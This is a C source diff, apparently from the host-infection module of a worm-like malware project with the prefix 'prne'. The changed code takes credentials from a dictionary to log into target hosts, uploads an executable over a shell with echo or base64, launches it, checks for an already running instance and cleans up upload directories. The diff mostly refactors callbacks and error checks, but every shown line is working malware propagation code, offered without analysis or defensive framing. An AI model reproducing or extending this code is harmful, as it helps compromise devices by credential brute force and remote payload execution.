@@ -207,7 +207,9 @@ static void bne_delete_cred_w_id (prne_bne_t *ctx, const char *id) {
 	prne_cred_dict_entry_t *ent;
 	const char *ent_id;
 
-	if (ctx->param.cb.enter_dd != NULL && !ctx->param.cb.enter_dd()) {
+	if (ctx->param.cb.enter_dd != NULL &&
+		!ctx->param.cb.enter_dd(ctx->param.cb_ctx))
+	{
 		return;
 	}
 
@@ -224,7 +226,7 @@ static void bne_delete_cred_w_id (prne_bne_t *ctx, const char *id) {
 	}
 
 	if (ctx->param.cb.exit_dd != NULL) {
-		ctx->param.cb.exit_dd();
+		ctx->param.cb.exit_dd(ctx->param.cb_ctx);
 	}
 }
 
@@ -254,7 +256,9 @@ static bool bne_pop_cred (
 	if (ctx->cred_set.size == 0) {
 		return false;
 	}
-	if (ctx->param.cb.enter_dd != NULL && !ctx->param.cb.enter_dd()) {
+	if (ctx->param.cb.enter_dd != NULL &&
+		!ctx->param.cb.enter_dd(ctx->param.cb_ctx))
+	{
 		ctx->result.err = errno;
 		return false;
 	}
@@ -376,7 +380,7 @@ END:
 	}
 
 	if (ctx->param.cb.exit_dd != NULL) {
-		ctx->param.cb.exit_dd();
+		ctx->param.cb.exit_dd(ctx->param.cb_ctx);
 	}
 
 	return ret;
@@ -1348,6 +1352,8 @@ static bool bne_sh_cleanup_upload (
 	}
 
 	cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
+	prne_free(s_ctx->upload_dir);
+	s_ctx->upload_dir = NULL;
 	if (cmd == NULL) {
 		return false;
 	}
@@ -1456,7 +1462,7 @@ static bool bne_sh_upload_echo (
 	bne_sh_parser_t parser;
 	int ec = -1;
 
-	_Static_assert(sizeof(s_ctx->buf) >= BPC, "FIXME");
+	prne_static_assert(sizeof(s_ctx->buf) >= BPC, "FIXME");
 	bne_init_sh_parser(&parser);
 	parser.ctx = &ec;
 	parser.line_f = bne_sh_int_parse_f;
@@ -1547,7 +1553,7 @@ static bool bne_sh_upload_base64 (
 	int ec = -1;
 	size_t len;
 
-	_Static_assert(sizeof(s_ctx->buf) >= BPC, "FIXME");
+	prne_static_assert(sizeof(s_ctx->buf) >= BPC, "FIXME");
 	bne_init_sh_parser(&parser);
 	parser.ctx = &ec;
 	parser.line_f = bne_sh_int_parse_f;
@@ -1641,11 +1647,20 @@ static bool bne_sh_run_exec (
 		}
 
 		switch (ec) {
-		case PRNE_PROONE_EC_OK:
-			// successful launch
+		case PRNE_PROONE_EC_OK: // successful launch
+			ctx->result.ny_instance = true;
+			ret = true;
+			break;
 		case PRNE_PROONE_EC_LOCK:
-			// failed to acquire lock
-			// assume that a process is already running
+			/*
+			* failed to acquire lock
+			* assume that a process is already running
+			*/
+			/*
+			* delete the upload dir so the mount point doesn't get stuffed up
+			* with temp dirs
+			*/
+			bne_sh_cleanup_upload(ctx, s_ctx);
 			ret = true;
 			break;
 		}
@@ -1697,7 +1712,7 @@ static bool bne_do_shell (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 // TRY
 	bne_build_host_cred(sh_ctx, ctx->result.cred.id, ctx->result.cred.pw);
 
-	exec_name = ctx->param.cb.exec_name();
+	exec_name = ctx->param.cb.exec_name(ctx->param.cb_ctx);
 	if (exec_name == NULL) {
 		ctx->result.err = errno;
 		goto END;
@@ -1748,8 +1763,7 @@ static bool bne_do_shell (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 			if (ret) {
 				ret =
 					upload_f(ctx, sh_ctx, exec_name) &&
-					bne_sh_run_exec(ctx, sh_ctx, exec_name) &&
-					bne_sh_cleanup_upload(ctx, sh_ctx);
+					bne_sh_run_exec(ctx, sh_ctx, exec_name);
 
 				if (ret) {
 					goto END;
@@ -1785,6 +1799,9 @@ static bool bne_do_vec_htbt (prne_bne_t *ctx) {
 	ep.port = PRNE_HTBT_PROTO_PORT;
 
 // TRY
+	if (ctx->param.htbt_ssl_conf == NULL) {
+		goto END;
+	}
 	if (mbedtls_ssl_setup(&ssl, ctx->param.htbt_ssl_conf) != 0) {
 		goto END;
 	}
@@ -3222,20 +3239,13 @@ prne_bne_t *prne_alloc_bne (
 	prne_bne_t *ret = NULL;
 	uint8_t seed[PRNE_RND_WELL512_SEEDLEN];
 
-	if (ctr_drbg == NULL || param->cb.exec_name == NULL) {
+	if (ctr_drbg == NULL ||
+		param->cb.exec_name == NULL ||
+		param->rcb.ba == NULL ||
+		param->cred_dict->cnt == 0)
+	{
 		errno = EINVAL;
 		return NULL;
-	}
-
-	for (size_t i = 0; i < param->vector.cnt; i += 1) {
-		switch (param->vector.arr[i]) {
-		case PRNE_BNE_V_HTBT:
-			if (param->htbt_ssl_conf == NULL) {
-				errno = EINVAL;
-				return NULL;
-			}
-			break;
-		}
 	}
 
 // TRY
@@ -3273,4 +3283,8 @@ ERR: // CATCH
 	}
 
 	return NULL;
+}
+
+const prne_ip_addr_t *prne_bne_get_subject (const prne_bne_t *bne) {
+	return bne->result.subject;
 }
